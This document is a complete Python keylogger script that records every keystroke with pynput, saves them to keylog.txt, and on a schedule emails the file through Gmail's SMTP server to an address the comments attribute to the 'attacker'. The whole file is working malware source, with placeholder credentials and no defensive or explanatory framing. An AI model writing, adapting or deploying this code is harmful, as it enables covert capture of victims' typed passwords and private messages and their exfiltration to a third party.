import logging
import smtplib
import time
import os
import threading
import schedule
import ssl
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# Global buffer to store keystrokes
buffer = []

# Function to send email with keylog file
def send_email():
    sender_email = "sender_email"  # Your email (attacker)
    sender_password = "sender_password"  # Use an app password
    recipient_email = "recipient_email"  # Email where logs are sent

    # SMTP server settings
    smtp_server = "smtp.gmail.com"
    smtp_port = 465

    # Create the email
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient_email
    message["Subject"] = "SUSSY KEYLOGGER"

    # Attach email body
    body = "Lol my life"
    message.attach(MIMEText(body, "plain"))
    
    

    # Attach keylog file
    filename = "keylog.txt"
    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={filename}")
            message.attach(part)

        # Secure connection and send email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, smtp_port, context=context) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, message.as_string())

        print(f"Keylog file sent to {recipient_email}")

    except Exception as e:
        print(f"Error sending email: {e}")

# Schedule the function to run every hour
schedule.every(8).hours.do(send_email)

print("Keylogger email scheduler started...")

# Function to write logged keys to file
def write_to_file():
    try:
        with open("keylog.txt", "a") as file:
            file.write("".join(buffer))
            buffer.clear()
            print("File logged")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function to capture key presses
def on_press(key):
    try:
        print(f'Alphanumeric key {key.char} pressed')
        buffer.append(key.char)
    except AttributeError:
        print(f'Special key {key} pressed')
        if key == keyboard.Key.space:
            buffer.append(' ')
        elif key == keyboard.Key.enter:
            buffer.append('\n')
            write_to_file()

# Function to capture key releases
def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start keylogger listener in a separate thread
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Keep script running and check email schedule
while True:
    schedule.run_pending()
    time.sleep(60)
